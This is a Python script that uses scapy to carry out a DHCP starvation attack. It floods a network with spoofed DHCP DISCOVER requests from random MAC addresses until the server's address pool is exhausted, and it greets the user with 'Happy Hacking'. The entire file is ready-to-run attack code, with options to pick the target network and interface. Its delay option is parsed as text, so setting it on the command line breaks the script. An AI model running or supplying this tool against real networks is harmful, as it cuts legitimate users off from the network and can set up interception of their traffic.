#!/usr/bin/python3

from scapy.all import RandMAC, Ether, IP, UDP, BOOTP, DHCP, sendp, conf
from time import sleep
from ipaddress import IPv4Network
import argparse

conf.checkIPaddr = False

def starve(params):
    delay      = params['delay']      if params.get('delay')     is not None else 0.5
    network    = params['network']    if params.get('network')   is not None else '192.168.1.0/24'
    interface  = params['interface']  if params.get('interface') is not None else 'eth0'
    is_verbose = params['verbose']    if params.get('verbose')   is not None else 1

    print('Starting DHCP starvation attack to the network {} at interface {}.'.format(network, interface))
    print('Delay for each packet is {} seconds.'.format(delay))
    print('Happy Hacking }:)')

    ips_for_feeding = IPv4Network(network)

    for ip_dir in ips_for_feeding:
        src_mac = RandMAC()

        ether = Ether(src=src_mac, dst='ff:ff:ff:ff:ff:ff')
        ip = IP(src='0.0.0.0', dst='255.255.255.255')
        udp = UDP(sport=68, dport=67)
        bootp = BOOTP(op=1, chaddr=src_mac)
        dhcp = DHCP(options=[
            ('message-type', 'discover'), 
            ('requested_addr', str(ip_dir)),
            ('end')])

        packet = ether / ip / udp / bootp / dhcp

        sendp(packet, iface=interface, verbose=is_verbose)

        sleep(delay)

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument(
        '--network', 
        type=str,
        nargs='?',
        help='IP address of the network (e.g. 192.168.1.0/24)',
    )
    parser.add_argument(
        '--delay', 
        type=str,
        nargs='?',
        help='Delay in seconds for each packet',
    )
    parser.add_argument(
        '--interface', 
        type=str,
        nargs='?',
        help='Interface to attack (eth0 as default)',
    )
    parser.add_argument(
        '--verbose', 
        type=int,
        nargs='?',
        help='Verbose mode 1=ON 0=OFF (1 as default)',
    )
    params = vars(parser.parse_args())
    starve(params)
